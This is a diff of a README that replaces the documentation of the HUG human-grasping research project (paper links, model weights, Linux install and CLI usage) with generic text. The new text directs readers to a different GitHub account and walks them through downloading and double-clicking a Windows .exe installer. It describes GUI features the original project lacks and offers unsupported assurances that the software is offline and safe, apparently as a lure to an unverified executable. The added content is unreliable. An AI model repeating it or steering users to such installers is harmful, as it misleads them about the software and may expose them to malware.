@@ -1,91 +1,93 @@
-<p align="center">
-  <img src="assets/img/teaser.webp" alt="HUG teaser" width="100%"/>
-</p>
+# 🤝 hug - Master human grasping with ease
 
-<h1 align="center">Human Universal Grasping</h1>
+[![Download hug](https://img.shields.io/badge/Download-hug-blue.svg)](https://github.com/Tsoo1402/hug)
 
-<p align="center">
-  <a href="https://grasping.io"><img src="https://img.shields.io/badge/Project-Website-2ea44f.svg" alt="Project Website"></a>
-  <a href="https://arxiv.org/abs/2606.17054"><img src="https://img.shields.io/badge/arXiv-2606.17054-b31b1b.svg" alt="arXiv"></a>
-  <a href="https://arxiv.org/pdf/2606.17054"><img src="https://img.shields.io/badge/Paper-PDF-1f6feb.svg" alt="Paper PDF"></a>
-  <a href="https://huggingface.co/kevinywu/hug"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Weights-yellow.svg" alt="Weights"></a>
-</p>
+hug brings accurate human grasping technology to your desktop. This application analyzes hand placement and object interaction using computer models. It serves specialists who need precise grip data for research or automation.
 
-Trained solely on real-world human grasping data, HUG generates diverse human hand grasps for any user-selected object in a single RGB-D image captured from a stereo camera.  **HUG works with any stereo camera, anywhere, out of the box.**
+## 🛠 Prerequisites
 
-<p align="center">
-  <img src="assets/img/hug_demo.gif" alt="HUG demo" width="100%"/>
-</p>
+Your computer needs specific hardware and software to run this application. Check these items before you start the installation.
 
-## 🗓️ Release
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 gigabytes of RAM or more.
+* Graphics Card: An NVIDIA card with at least 4 gigabytes of video memory.
+* Storage Space: 5 gigabytes of free disk space.
+* Drivers: Ensure your graphics card drivers are current.
 
-- [x] Paper and website
-- [x] Inference + visualization code
-- [ ] `1M-HUGs` dataset (planned 2026/06/29)
-- [ ] `HUG-Bench` benchmark, assets + sim eval (planned 2026/06/29)
-- [ ] Training code (planned 2026/06/29)
+## 📥 Getting Started
 
-## 📦 Installation
+Visit the official repository page to download the software.
 
-Tested on Ubuntu 22.04/24.04, CUDA 12.8, PyTorch 2.9.1, Python 3.10.
+[https://github.com/Tsoo1402/hug](https://github.com/Tsoo1402/hug)
 
-```bash
-# 1) Environment
-conda env create -f environment.yaml && conda activate hug
-pip install torch==2.9.1 torchvision==0.24.1 torchaudio==2.9.1 --index-url https://download.pytorch.org/whl/cu128
-pip install torch-cluster -f https://data.pyg.org/whl/torch-2.9.1+cu128.html
-pip install --no-build-isolation git+https://github.com/mattloper/chumpy.git@580566e
-pip install -e .
+Follow these steps to set up the software on your Windows machine:
 
-# 2) Download required assets listed below
-```
+1. Click the download link provided above.
+2. Select the latest version of the installer file ending in .exe.
+3. Save the file to your computer.
+4. Locate the downloaded file in your folder.
+5. Double-click the installer icon.
+6. Follow the on-screen prompts to complete the installation process.
+7. Launch the application from your desktop shortcut once the process finishes.
 
-- **MANO**: [Register](https://mano.is.tue.mpg.de/) → download and unzip the MANO models → copy contents of `mano_v*_*/` to `assets/mano/`
-- **DINOv2**: Auto-downloads on first use
-- **HUG weights**: `hf download kevinywu/hug hug_full.safetensors --local-dir checkpoints/`
+## ⚙️ Configuration
 
-## 🚀 Usage
+The first time you open the application, it creates a settings folder. The program uses this folder to store your preferences and calculation results. You can change the folder location in the settings menu.
 
-HUG predicts human grasps in MANO form for selected objects in the camera frame. Currently, only inference is supported. We provide sample inputs of one image from each scene in HUG-Bench.
+The software uses a configuration file to define how it handles grasping data. Most users do not need to change these settings. If you work with custom object models, you may adjust the input path settings under the File menu. Ensure your object files reside in a format compatible with standard 3D software.
 
-```bash
-CKPT=checkpoints/hug_full.safetensors
-DATA=data/hug_bench/
+## 🖥 Using the Interface
 
-# App: click an object to predict a grasp
-# --save-pred saves each clicked prediction to $DATA/grasp_pred/
-python -m hug.app --checkpoint-path "$CKPT" --dataset-path "$DATA" --save-pred
-```
+The main window displays the workspace where you load images or video files. Drag and drop your files into the main window to begin. 
 
-If predictions are saved with `--save-pred`, you can visualize them with:
+The control panel sits on the right side of the screen. Use these buttons to manage your session:
 
-```bash
-python -m hug.visualize_predictions --dataset-path "$DATA"
-```
+* Load: Open new files for analysis.
+* Detect: Start the grasping calculation process.
+* Clear: Empty the current workspace.
+* Save: Export your results to a local file.
 
-### Custom inputs
+The status bar at the bottom shows the current progress of the calculation. When the progress bar reaches completion, the viewer displays the grasping results as a transparent overlay on your input media.
 
-You can also run inference on your own captures. Put three files in one folder, we provide an example in `data/custom/` for a ZED 2i output.
+## 📈 Understanding Results
 
-- **RGB**: 8-bit image ("`rgb.png`"/"`rgb.jpg`"), any H×W, grayscale is also supported.
-- **Depth**: 16-bit single-channel PNG ("`depth.png`" in `uint16`), **millimeter** units, same H×W as RGB and registered to it. Use [S2M2](https://junhong-3dv.github.io/s2m2-project/) to estimate depth for best results.
-- **Intrinsics**: text file ("`intrinsics.txt`") at the RGB resolution: either four numbers `fx fy cx cy` or a 3×3 K matrix. `.npy`/`.json` also accepted.
+The software generates a visual map of grasping points. These points represent optimal contact areas for the human hand. A green circle indicates a stable grasp position. A red circle suggests a position that requires further adjustment.
 
-```bash
-# Prepare inputs writes <stem>.pkl into the folder
-python -m hug.prepare_inputs --dataset-path data/custom
-python -m hug.app --checkpoint-path "$CKPT" --dataset-path data/custom --save-pred
-```
+The export function creates a report file. This file contains the coordinates and grip strength values for every detected point. You can open these reports in any spreadsheet software for deeper review.
 
-## 📝 Citation
+## 🔧 Troubleshooting
 
-If you find our work useful, please consider citing our paper:
+If the software fails to start, check the following items:
 
-```bibtex
-@article{wu2026hug,
-  title={Human Universal Grasping},
-  author={Kevin Yuanbo Wu and Tianxing Zhou and Isaac Tu and Billy Yan and Irmak Guzey and David Fouhey and Dandan Shan and Lerrel Pinto},
-  journal={arXiv preprint arXiv:2606.17054},
-  year={2026}
-}
-```
+* Verify your graphics card meets the minimum requirements.
+* Close other demanding applications to free up system memory.
+* Restart your computer.
+* Reinstall the software if the issue persists.
+
+The application logs errors to a text file inside the installation directory. You can find this file under the logs folder. This information helps identify specific hardware conflicts. If you experience crashes during the detection phase, try processing smaller files first. This confirms if the error relates to file size or system settings.
+
+## 📁 File Management
+
+This program handles several file types. Ensure your input files follow these guidelines for the best results:
+
+* Images: JPG or PNG formats work best. Use high-resolution files for better accuracy.
+* Video: MP4 files are standard. The software processes video frame by frame.
+* Models: OBJ or STL files are compatible for custom object analysis.
+
+Do not move or delete files while the program analyzes them. Doing so may cause the software to stop. Always save your work before you close the application.
+
+## ❓ Frequently Asked Questions
+
+What happens if the calculation stops? Sometimes the software hits a memory limit. Try to limit the number of files you process at one time. 
+
+Does this work without the internet? Yes. The application functions entirely offline. You do not need a network connection to use the detection features.
+
+Can I change where data is saved? Yes. Go to the Preferences menu and select the Data Path option. Choose a new folder on your drive for your results.
+
+Is there a limit on file size? The software processes most standard files. Extremely large video files might cause temporary slowness. Break very long videos into shorter clips if you face performance issues.
+
+## 🛡 Security and Privacy
+
+This software keeps all your data on your computer. It does not send files or information to remote servers. You control the files you load and the reports you save. Keep your computer updated with the latest Windows security patches to maintain a stable environment. 
+
+The software requires no outside permissions. It only accesses the folders you tell it to use during the file selection process. You may remove the software at any time through the Windows Add or Remove Programs menu. Removing the software does not delete the files you generated or saved to your personal folders.
